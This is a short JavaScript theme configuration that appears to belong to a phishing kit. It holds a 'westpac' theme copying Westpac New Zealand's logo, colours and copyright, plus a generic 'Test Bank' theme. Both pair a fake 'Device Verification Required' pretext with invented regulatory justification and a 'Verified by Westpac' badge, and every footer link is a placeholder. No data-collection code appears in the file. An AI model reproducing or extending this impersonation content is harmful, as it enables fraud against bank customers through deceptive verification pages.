window.themes = {
    westpac: {
        name: "Westpac",
        logo: "./assets/westpac-logo.png",
        primaryColor: "#DA1710",
        secondaryColor: "#B5140E",
        styles: "themes/westpac.css",
        content: {
            title: "Device Verification Required",
            message: "Please verify your device to continue",
            subMessage: "To comply with recent banking regulations and ensure your account security, we need to verify this device.",
            buttonText: "Verify Device",
            badges: [
                { icon: "🔒", text: "Bank-Grade Security" },
                { icon: "✓", text: "Verified by Westpac" }
            ],
            infoBox: {
                title: "Why is this required?",
                points: [
                    "Protect against unauthorized access",
                    "Comply with NZ banking regulations",
                    "Ensure secure transactions"
                ]
            },
            footer: {
                copyright: "© 2024 Westpac New Zealand Limited. All rights reserved.",
                links: [
                    { text: "Privacy", url: "#" },
                    { text: "Security", url: "#" },
                    { text: "Terms of Use", url: "#" }
                ]
            }
        }
    },
    test: {
        name: "Test Bank",
        logo: "./assets/test-bank-logo.png",
        primaryColor: "#4CAF50",
        secondaryColor: "#388E3C",
        styles: "themes/test.css",
        content: {
            title: "Security Check Required",
            message: "Your security is our priority",
            subMessage: "As part of our enhanced security measures, we need to verify your current device before proceeding.",
            buttonText: "Start Verification",
            badges: [
                { icon: "🛡️", text: "Enhanced Security" },
                { icon: "📱", text: "Device Protection" }
            ],
            infoBox: {
                title: "About this verification",
                points: [
                    "Protect your account from unauthorized access",
                    "Enhance your online banking security",
                    "Quick and easy verification process"
                ]
            },
            footer: {
                copyright: "© 2024 Test Bank. All rights reserved.",
                links: [
                    { text: "Privacy Policy", url: "#" },
                    { text: "Security Center", url: "#" },
                    { text: "Help", url: "#" }
                ]
            }
        }
    }
};
